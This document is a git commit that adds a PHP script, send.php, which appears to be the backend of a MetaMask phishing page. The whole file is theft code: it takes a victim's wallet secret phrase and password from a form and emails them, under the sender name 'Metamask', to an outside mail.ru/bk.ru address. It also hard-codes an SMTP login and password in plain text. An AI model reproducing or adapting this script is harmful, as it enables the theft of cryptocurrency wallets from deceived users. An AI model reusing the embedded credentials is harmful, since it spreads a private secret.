7d7f241c7ddff5287aa13a78017474cd74fd3a84
SSWFreelancer <97734977+SSWFreelancer@users.noreply.github.com>
2022-03-15 21:18:07 +0500

    Add files via upload

---
+++ send.php
@@ -0,0 +1,68 @@
+<?php
+// Файлы phpmailer
+require 'phpmailer/PHPMailer.php';
+require 'phpmailer/SMTP.php';
+require 'phpmailer/Exception.php';
+
+// Переменные, которые отправляет пользователь
+$pass = $_POST['newpassword'];
+$secfrase = $_POST['secfrase'];
+
+
+// Формирование самого письма
+$title = "Заголовок письма";
+$body = "
+<h2>Metamask</h2>
+<b>Секретная фраза:</b> $secfrase<br><br>
+<b>Пароль:</b> $pass<br><br>";
+
+// Настройки PHPMailer
+$mail = new PHPMailer\PHPMailer\PHPMailer();
+try {
+    $mail->isSMTP();   
+    $mail->CharSet = "UTF-8";
+    $mail->SMTPAuth   = true;
+    //$mail->SMTPDebug = 2;
+    $mail->Debugoutput = function($str, $level) {$GLOBALS['status'][] = $str;};
+
+    // Настройки вашей почты
+    $mail->Host       = 'smtp.mail.ru'; // SMTP сервера вашей почты
+    $mail->Username   = 'shoyev00'; // Логин на почте
+    $mail->Password   = 'ezU7jS44GHJqmke2ESGC'; // Пароль на почте
+    $mail->SMTPSecure = 'ssl';
+    $mail->Port       = 465;
+    $mail->setFrom('shoyev00@mail.ru', 'Metamask'); // Адрес самой почты и имя отправителя
+
+    // Получатель письма
+    $mail->addAddress('latypovradel@bk.ru');  
+    // $mail->addAddress('sswfreelance@mail.ru'); Ещё один, если нужен
+
+    // Прикрипление файлов к письму
+if (!empty($file['name'][0])) {
+    for ($ct = 0; $ct < count($file['tmp_name']); $ct++) {
+        $uploadfile = tempnam(sys_get_temp_dir(), sha1($file['name'][$ct]));
+        $filename = $file['name'][$ct];
+        if (move_uploaded_file($file['tmp_name'][$ct], $uploadfile)) {
+            $mail->addAttachment($uploadfile, $filename);
+            $rfile[] = "Файл $filename прикреплён";
+        } else {
+            $rfile[] = "Не удалось прикрепить файл $filename";
+        }
+    }   
+}
+// Отправка сообщения
+$mail->isHTML(true);
+$mail->Subject = $title;
+$mail->Body = $body;    
+
+// Проверяем отравленность сообщения
+if ($mail->send()) {$result = "success";} 
+else {$result = "error";}
+
+} catch (Exception $e) {
+    $result = "error";
+    $status = "Сообщение не было отправлено. Причина ошибки: {$mail->ErrorInfo}";
+}
+
+// Отображение результата
+echo json_encode(["result" => $result, "resultfile" => $rfile, "status" => $status]);
